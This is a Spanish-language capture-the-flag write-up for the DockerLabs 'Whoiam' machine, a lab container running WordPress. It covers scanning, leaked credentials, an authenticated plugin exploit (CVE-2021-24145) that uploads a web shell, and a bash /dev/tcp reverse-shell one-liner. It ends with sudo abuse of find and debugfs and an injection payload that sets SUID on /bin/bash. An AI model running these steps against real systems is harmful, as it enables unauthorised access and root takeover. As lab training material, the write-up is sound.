---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Whoiam DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip whoiam.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh whoiam.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-31 10:14 EST
Nmap scan report for 172.18.0.2
Host is up (0.000031s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-generator: WordPress 6.5.4
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Whoiam
MAC Address: 02:42:AC:12:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.06 seconds
```

Si entramos en una pagina vemos algo normal, por lo que vamos a realizar un poco de `fuzzing`.

```shell
whatweb http://<IP>/
```

Info:

```
http://172.18.0.2/ [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.18.0.2], JQuery[3.7.1], MetaGenerator[WordPress 6.5.4], Script, Title[Whoiam], UncommonHeaders[link], WordPress[6.5.4]
```

Vemos que hay un `wordpress`, por lo que vamos a utilizar una herramienta llamada `wpscan`.

## wpscan

```shell
wpscan --url http://172.18.0.2
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://172.18.0.2/ [172.18.0.2]
[+] Started: Fri Jan 31 10:16:58 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.18.0.2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://172.18.0.2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://172.18.0.2/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://172.18.0.2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.4 identified (Insecure, released on 2024-06-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://172.18.0.2/index.php/feed/, <generator>https://wordpress.org/?v=6.5.4</generator>
 |  - http://172.18.0.2/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.5.4</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://172.18.0.2/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://172.18.0.2/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://172.18.0.2/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://172.18.0.2/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] modern-events-calendar-lite
 | Location: http://172.18.0.2/wp-content/plugins/modern-events-calendar-lite/
 | Last Updated: 2022-05-10T21:06:00.000Z
 | [!] The version is out of date, the latest version is 6.5.6
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.16.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://172.18.0.2/wp-content/plugins/modern-events-calendar-lite/readme.txt
 | Confirmed By: Change Log (Aggressive Detection)
 |  - http://172.18.0.2/wp-content/plugins/modern-events-calendar-lite/changelog.txt, Match: '5.16.2'

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <==============================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jan 31 10:17:02 2025
[+] Requests Done: 188
[+] Cached Requests: 5
[+] Data Sent: 45.131 KB
[+] Data Received: 22.184 MB
[+] Memory used: 284.805 MB
[+] Elapsed time: 00:00:04
```

Vemos que hay un plugin llamado `modern-events-calendar-lite`, por lo que vamos a ver si tuviera algun exploit asociado.

Vemos que hay un `exploit`, pero tendremos que tener las credenciales de `worpress` para ello:

URL = [Exploit GitHub](https://github.com/Hacker5preme/Exploits/tree/main/Wordpress/CVE-2021-24145)

Si realizamos un poco mas de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.18.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/backups              (Status: 200) [Size: 965]
/index.php            (Status: 200) [Size: 48516]
/license.txt          (Status: 200) [Size: 19915]
/readme.html          (Status: 200) [Size: 7401]
/server-status        (Status: 403) [Size: 275]
/wp-content           (Status: 200) [Size: 0]
/wp-includes          (Status: 200) [Size: 58715]
/wp-config.php        (Status: 200) [Size: 0]
/xmlrpc.php           (Status: 405) [Size: 42]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-login.php         (Status: 200) [Size: 4039]
/wp-admin             (Status: 200) [Size: 4039]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que encontramos un directorio llamado `/backups` que contiene lo siguiente:

## Escalate user www-data

```
databaseback2may.zip
```

Nos lo descargamos y lo descomprimimos:

```shell
unzip databaseback2may.zip
```

Y veremos el siguiente archivo:

```
cat 29DBMay
```

Info:

```
| Username  |         Password        |
|-----------|-------------------------|
| developer | 2wmy3KrGDRD%RsA7Ty5n71L^|
|-----------|-------------------------|
```

Por lo que vemos ya tendremos las credenciales, por lo que con el `exploit` que encontramos anteriromente lo utilizaremos de la siguiente forma:

```shell
python3 exploit.py -T 172.18.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^
```

Info:

```
/home/kali/Desktop/whoami/exploit.py:23: SyntaxWarning: invalid escape sequence '\ '
  banner = """

  ______     _______     ____   ___ ____  _      ____  _  _   _ _  _  ____  
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \| || | / | || || ___| 
| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | || |_| | || ||___ \ 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/|__   _| |__   _|__) |
 \____|  \_/  |_____|   |_____|\___/_____|_|    |_____|  |_| |_|  |_||____/ 
                                
                * Wordpress Plugin Modern Events Calendar Lite RCE                                                        
                * @Hacker5preme
                    




[+] Authentication successfull !

[+] Shell Uploaded to: http://172.18.0.2:80//wp-content/uploads/shell.php
```

Y vemos que nos creo un `shell.php` en la siguiente ruta.

```
URL = http://<IP>/wp-content/uploads/shell.php
```

Si entramos a ella veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

Vemos que tendremos una `shell` interactiva, por lo que haremos lo siguiente.

## Escalate user rafa

Vamos a enviarnos una `shell`.

```shell
bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
```

Antes de enviarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Lo ejecutamos el codigo anterior y si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [172.18.0.1] from (UNKNOWN) [172.18.0.2] 44308
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@454dd5633d8b:/var/www/html/wp-content/uploads$ whoami
whoami
www-data
```

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on 454dd5633d8b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on 454dd5633d8b:
    (rafa) NOPASSWD: /usr/bin/find
```

Vemos que podremos ejecutar el binario `find` como el usuario `rafa`, por lo que haremos lo siguiente:

```shell
sudo -u rafa find . -exec /bin/bash \; -quit
```

Con esto seremos el usuario `rafa`.

## Escalate user ruben

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for rafa on 454dd5633d8b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User rafa may run the following commands on 454dd5633d8b:
    (ruben) NOPASSWD: /usr/sbin/debugfs
```

Vemos que podemos ejecutar el binario `debugfs` como el usuario `ruben`, por lo que haremos lo siguiente:

```shell
sudo -u ruben debugfs
!/bin/bash
```

Y con esto ya seremos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for ruben on 454dd5633d8b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ruben may run the following commands on 454dd5633d8b:
    (ALL) NOPASSWD: /bin/bash /opt/penguin.sh
```

Veremos que podremos ejecutar el binario `bash` junto al `script` llamado `penguin.sh` como el usuario `root`, por lo que haremos lo siguiente:

Si leemos el script, veremos lo siguiente:

```bash
#!/bin/bash

read -rp "Enter guess: " num

if [[ $num -eq 42 ]]
then
  echo "Correct"
else
  echo "Wrong"
fi
```

Por lo que vemos si ponemos el numero `42` nos da la frase correcta, por lo que podremos aprovechar esto para hacer lo siguiente:

```shell
sudo bash /opt/penguin.sh
```

Metemos este codigo:

```shell
prueba[$(chmod u+s /bin/bash >&2)]+42
```

> Explicacion:

* `prueba[ ... ]+42` → Se ve como un intento de asignación de un array en Bash. Pero lo importante es lo que está dentro del `[ ... ]`.
* `$(chmod u+s /bin/bash >&2)` →
  * La expresión `$()` ejecuta el comando dentro de ella en un **subproceso**.
  * `chmod u+s /bin/bash` da permisos **SUID** a `/bin/bash`, lo que significa que cualquier usuario que ejecute `/bin/bash` tendrá privilegios de **root**.
  * `>&2` redirige la salida estándar a `stderr`, aunque en este caso no es esencial.
* `prueba[ ... ]+42` →
  * **Bash ejecuta primero el contenido de `$()`** antes de asignarlo a una variable.
  * Al ejecutar `chmod u+s /bin/bash`, la bash del sistema ahora tiene permisos de root.
  * Luego, `read` asigna lo que queda (`prueba[ ]+42`), pero el daño ya está hecho.

#### **¿Por qué funciona si el script se ejecuta como root?**

* Si este script es ejecutado por **root**, cualquier comando dentro de `$()` también se ejecuta con **privilegios de root**.
* `chmod u+s /bin/bash` solo puede ser ejecutado por `root`, pero en este caso, el usuario **aprovecha el script que ya está corriendo como root** para que lo haga por él.
* Después de la ejecución, `/bin/bash` se convierte en un binario SUID, lo que significa que **cualquier usuario puede abrir una sesión Bash con privilegios de root**

Info:

```
Enter guess: prueba[$(chmod u+s /bin/bash >&2)]+42
Correct
```

Y con esto vamos a comprobar que se haya aplicado correctamente.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Vemos que ha funcionado estableciendo los permisos `SUID` a la `bash`, por lo que haremos lo siguiente:

```shell
bash -p
```

Info:

```
bash-5.2# whoami
root
```

Y con esto veremos que seremos el usuario `root`, por lo que habremos termiando la maquina.
